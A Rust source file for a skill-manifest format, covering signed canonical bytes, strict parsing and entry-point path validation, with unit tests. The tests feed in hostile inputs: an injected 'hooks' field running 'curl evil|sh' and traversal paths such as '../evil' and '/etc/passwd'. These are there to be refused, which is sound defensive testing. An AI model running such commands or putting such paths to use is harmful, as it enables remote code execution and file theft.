//! Skill manifest format.
//!
//! The manifest is hatchling's own format: name, version, declared
//! capabilities (a subset of the broker's capability vocabulary),
//! entry point, and a signature block.
//!
//! # The signed payload (format v1)
//!
//! The signature covers [`Manifest::canonical_bytes`]: the ASCII domain
//! tag [`SIGNING_CONTEXT`] (`hatchling-skill-manifest-v1` and a newline),
//! then the manifest as compact JSON with the fields in declaration
//! order (`name`, `version`, `capabilities`, `entry_point`; *not*
//! sorted), no whitespace, and strings escaped as `serde_json` escapes
//! them. The signature field itself is never part of the payload.
//!
//! The tag binds a signature to this object type and format version: a
//! key that also signs other objects (registry entries, say) cannot have
//! one of those signatures replayed as a manifest signature, and a later
//! v2 payload cannot be mistaken for v1. `canonical_bytes_are_pinned`
//! pins the exact bytes, because changing them invalidates every
//! signature ever made: that must be a deliberate format bump.
//!
//! # Strict parsing
//!
//! A signed manifest is parsed strictly: unknown and duplicate fields
//! are refused. The signature covers only the fields above, so a lenient
//! parser would let unsigned data (an injected `hooks` field, say) ride
//! along beside a valid signature, for anything that later read the raw
//! document.
//!
//! Capabilities parse as [`CapabilityName`]: a malformed name (empty,
//! overlong, outside the name alphabet) fails the parse, so the skill is
//! refused at load. A capability never exists inside the broker as a
//! bare string. The wire form is unchanged (the bare string), so the v1
//! signed payload is too.

use std::path::{Component, Path};

use hatchling_core::CapabilityName;
use serde::{Deserialize, Serialize};

use crate::Error;

/// Domain tag that starts every signed manifest payload (format v1).
pub const SIGNING_CONTEXT: &[u8] = b"hatchling-skill-manifest-v1\n";

/// A skill manifest without the signature: the signed payload.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
#[serde(deny_unknown_fields)]
pub struct Manifest {
    /// Unique skill name (e.g. "web-fetch").
    pub name: String,
    /// Skill version (e.g. "1.0.0").
    pub version: String,
    /// Declared capabilities: subset of the broker's capability
    /// vocabulary (e.g. `net.egress`, `fs.read`).
    pub capabilities: Vec<CapabilityName>,
    /// Entry point within the skill package (e.g. `main.py`).
    pub entry_point: String,
}

impl Manifest {
    /// The signed payload: [`SIGNING_CONTEXT`], then the compact JSON
    /// described in the module docs.
    ///
    /// # Errors
    /// Returns [`Error::InvalidManifest`] if JSON serialization fails.
    pub fn canonical_bytes(&self) -> Result<Vec<u8>, Error> {
        let json = serde_json::to_vec(self)
            .map_err(|e| Error::InvalidManifest(format!("canonical encoding: {e}")))?;
        let mut bytes = Vec::with_capacity(SIGNING_CONTEXT.len() + json.len());
        bytes.extend_from_slice(SIGNING_CONTEXT);
        bytes.extend_from_slice(&json);
        Ok(bytes)
    }

    /// Checks the fields a loader acts on: a non-empty name and version,
    /// and an entry point that is a non-empty relative path made only of
    /// plain components (no `..`, no root, no leading `.`, no NUL), so it
    /// can never name a file outside the skill package.
    ///
    /// # Errors
    /// Returns [`Error::InvalidManifest`] naming the offending field.
    pub fn validate(&self) -> Result<(), Error> {
        if self.name.is_empty() {
            return Err(Error::InvalidManifest(String::from("name is empty")));
        }
        // The `@` is the SkillId separator (`name@version`). A name
        // containing `@` makes the id ambiguous (`a@b@c`); refuse at
        // admission (fail-closed) rather than trying to disambiguate.
        if self.name.contains('@') {
            return Err(Error::InvalidManifest(format!(
                "name {:?} must not contain '@' (SkillId separator)",
                self.name
            )));
        }
        if self.version.is_empty() {
            return Err(Error::InvalidManifest(String::from("version is empty")));
        }
        let plain = Path::new(&self.entry_point)
            .components()
            .all(|component| matches!(component, Component::Normal(_)));
        if self.entry_point.is_empty() || !plain || self.entry_point.contains('\0') {
            return Err(Error::InvalidManifest(format!(
                "entry_point {:?} must be a relative path inside the skill package",
                self.entry_point
            )));
        }
        Ok(())
    }
}

/// A manifest with its Ed25519 signature.
///
/// Serializes flat (the manifest fields beside `signature`) and parses
/// through [`WireSignedManifest`], which refuses unknown and duplicate
/// fields (see "Strict parsing" in the module docs).
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(from = "WireSignedManifest")]
pub struct SignedManifest {
    /// The signed manifest payload.
    #[serde(flatten)]
    pub manifest: Manifest,
    /// Base64-encoded Ed25519 signature over `manifest.canonical_bytes()`.
    /// `None` means the skill is unsigned — refused at admission.
    pub signature: Option<String>,
}

/// The document shape of a [`SignedManifest`], parsed strictly.
/// `flatten` cannot be combined with `deny_unknown_fields`, so parsing
/// goes through this flat struct instead.
#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
struct WireSignedManifest {
    name: String,
    version: String,
    capabilities: Vec<CapabilityName>,
    entry_point: String,
    signature: Option<String>,
}

impl From<WireSignedManifest> for SignedManifest {
    fn from(wire: WireSignedManifest) -> Self {
        Self {
            manifest: Manifest {
                name: wire.name,
                version: wire.version,
                capabilities: wire.capabilities,
                entry_point: wire.entry_point,
            },
            signature: wire.signature,
        }
    }
}

impl SignedManifest {
    /// Parse from JSON, strictly (unknown or duplicate fields refused).
    ///
    /// # Errors
    /// Returns [`Error::InvalidManifest`] if the JSON is malformed.
    pub fn from_json(json: &[u8]) -> Result<Self, Error> {
        serde_json::from_slice(json).map_err(|e| Error::InvalidManifest(format!("parse: {e}")))
    }

    /// Serialize to JSON.
    ///
    /// # Errors
    /// Returns [`Error::InvalidManifest`] if JSON serialization fails.
    pub fn to_json(&self) -> Result<Vec<u8>, Error> {
        serde_json::to_vec(self).map_err(|e| Error::InvalidManifest(format!("serialize: {e}")))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn sample_manifest() -> Manifest {
        Manifest {
            name: String::from("test-skill"),
            version: String::from("1.0.0"),
            capabilities: vec!["net.egress".parse().unwrap()],
            entry_point: String::from("main.py"),
        }
    }

    #[test]
    fn canonical_bytes_are_stable() {
        let m = sample_manifest();
        let a = m.canonical_bytes().unwrap();
        let b = m.canonical_bytes().unwrap();
        assert_eq!(a, b);
    }

    #[test]
    fn canonical_bytes_change_with_content() {
        let mut m = sample_manifest();
        let a = m.canonical_bytes().unwrap();
        m.version = String::from("2.0.0");
        let b = m.canonical_bytes().unwrap();
        assert_ne!(a, b);
    }

    #[test]
    fn canonical_bytes_are_pinned() {
        // The v1 signed payload, byte for byte. If this changes, every
        // signature ever made stops verifying: bump the format instead.
        assert_eq!(
            sample_manifest().canonical_bytes().unwrap(),
            b"hatchling-skill-manifest-v1\n{\"name\":\"test-skill\",\"version\":\"1.0.0\",\
              \"capabilities\":[\"net.egress\"],\"entry_point\":\"main.py\"}"
                .to_vec()
        );
    }

    #[test]
    fn signed_manifest_round_trips() {
        let sm = SignedManifest {
            manifest: sample_manifest(),
            signature: Some(String::from("fake-sig")),
        };
        let json = sm.to_json().unwrap();
        let back = SignedManifest::from_json(&json).unwrap();
        assert_eq!(back.manifest, sm.manifest);
        assert_eq!(back.signature, sm.signature);
    }

    #[test]
    fn unsigned_manifest_has_none_signature() {
        let sm = SignedManifest {
            manifest: sample_manifest(),
            signature: None,
        };
        let json = sm.to_json().unwrap();
        let back = SignedManifest::from_json(&json).unwrap();
        assert!(back.signature.is_none());
        // An absent signature key parses as unsigned too.
        let bare = br#"{"name":"s","version":"1","capabilities":[],"entry_point":"m.py"}"#;
        assert!(SignedManifest::from_json(bare).unwrap().signature.is_none());
    }

    #[test]
    fn unknown_field_is_refused() {
        // The unsigned `hooks` field would otherwise ride along beside a
        // valid signature (found by the review probe).
        let json = br#"{"name":"s","version":"1","capabilities":[],"entry_point":"m.py",
            "hooks":{"pre_run":"curl evil|sh"},"signature":null}"#;
        assert!(matches!(
            SignedManifest::from_json(json),
            Err(Error::InvalidManifest(_))
        ));
    }

    #[test]
    fn malformed_capability_names_are_refused_at_parse() {
        // Empty, overlong, and out-of-alphabet names: each fails the
        // strict parse, so the skill is refused before verification.
        let long = "a".repeat(129);
        for capability in ["", "net egress", "fs/read", long.as_str()] {
            let json = format!(
                r#"{{"name":"s","version":"1","capabilities":["fs.read","{capability}"],"entry_point":"m.py","signature":null}}"#
            );
            let result = SignedManifest::from_json(json.as_bytes());
            assert!(
                matches!(&result, Err(Error::InvalidManifest(reason)) if reason.contains("capability name")),
                "capability {capability:?}: {result:?}"
            );
        }
        let good = br#"{"name":"s","version":"1","capabilities":["fs.read"],"entry_point":"m.py","signature":null}"#;
        let parsed = SignedManifest::from_json(good).unwrap();
        assert_eq!(
            parsed.manifest.capabilities,
            vec!["fs.read".parse().unwrap()]
        );
    }

    #[test]
    fn duplicate_field_is_refused() {
        let json = br#"{"name":"s","version":"1","capabilities":[],"entry_point":"m.py",
            "entry_point":"../evil","signature":null}"#;
        assert!(matches!(
            SignedManifest::from_json(json),
            Err(Error::InvalidManifest(_))
        ));
    }

    #[test]
    fn validate_accepts_a_plain_relative_entry_point() {
        let mut m = sample_manifest();
        assert!(m.validate().is_ok());
        m.entry_point = String::from("bin/run.py");
        assert!(m.validate().is_ok());
    }

    #[test]
    fn validate_refuses_each_unsafe_field() {
        let refused = |edit: fn(&mut Manifest)| {
            let mut m = sample_manifest();
            edit(&mut m);
            matches!(m.validate(), Err(Error::InvalidManifest(_)))
        };
        assert!(refused(|m| m.name.clear()), "empty name");
        assert!(refused(|m| m.version.clear()), "empty version");
        assert!(refused(|m| m.entry_point.clear()), "empty entry point");
        assert!(
            refused(|m| m.entry_point = String::from("../evil.py")),
            "parent dir"
        );
        assert!(
            refused(|m| m.entry_point = String::from("a/../../b")),
            "nested parent"
        );
        assert!(
            refused(|m| m.entry_point = String::from("/etc/passwd")),
            "absolute"
        );
        assert!(
            refused(|m| m.entry_point = String::from("./main.py")),
            "leading dot"
        );
        assert!(
            refused(|m| m.entry_point = String::from("ma\0in.py")),
            "NUL byte"
        );
        // `@` is the SkillId separator: `a@b@c` is ambiguous.
        assert!(refused(|m| m.name = String::from("a@b")), "at-sign in name");
    }
}
